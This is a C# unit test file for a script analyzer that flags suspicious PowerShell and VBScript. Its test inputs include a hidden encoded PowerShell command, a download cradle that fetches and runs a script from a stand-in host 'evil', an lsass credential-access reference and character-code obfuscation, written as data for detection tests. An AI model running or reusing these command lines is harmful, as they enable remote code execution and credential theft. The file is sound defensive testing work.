using Sentinel.Core.Detection;
using Sentinel.Core.Models;
using Xunit;

namespace Sentinel.Tests;

public class ScriptAnalyzerTests
{
    [Fact]
    public void PlainScript_ProducesNoEvidence()
    {
        var ev = ScriptAnalyzer.AnalyzeText(@"C:\x.ps1", "Get-Process | Where-Object { $_.CPU -gt 10 }");
        Assert.Empty(ev);
    }

    [Fact]
    public void EncodedCommand_IsFlaggedHigh()
    {
        var ev = ScriptAnalyzer.AnalyzeText(@"C:\x.ps1", "powershell -nop -w hidden -enc SQBFAFgA");
        var hit = Assert.Single(ev, e => e.Event == "script-encoded-command");
        Assert.Equal(Severity.High, hit.Severity);
    }

    [Fact]
    public void DownloadCradle_IsFlagged()
    {
        var ev = ScriptAnalyzer.AnalyzeText(@"C:\x.ps1",
            "iex (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')");
        Assert.Contains(ev, e => e.Event == "script-download-cradle" && e.Severity == Severity.High);
    }

    [Fact]
    public void CredentialReference_IsFlagged()
    {
        var ev = ScriptAnalyzer.AnalyzeText(@"C:\x.ps1", "$h = Get-Process lsass; Add-Type -Path \"x\"");
        Assert.Contains(ev, e => e.Event == "script-credential-access");
    }

    [Fact]
    public void ObfuscatedCharCode_IsFlagged()
    {
        var ev = ScriptAnalyzer.AnalyzeText(@"C:\x.vbs",
            "s = Chr(80) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)");
        Assert.Contains(ev, e => e.Event == "script-obfuscated" || e.Event == "script-encoded-command");
    }

    [Fact]
    public void ExtensionGating_RecognizesScriptFiles()
    {
        Assert.True(ScriptAnalyzer.IsScriptFile("a.ps1"));
        Assert.True(ScriptAnalyzer.IsScriptFile("a.bat"));
        Assert.True(ScriptAnalyzer.IsScriptFile("a.vbs"));
        Assert.True(ScriptAnalyzer.IsScriptFile("a.hta"));
        Assert.False(ScriptAnalyzer.IsScriptFile("a.exe"));
        Assert.False(ScriptAnalyzer.IsScriptFile("a.dll"));
    }
}
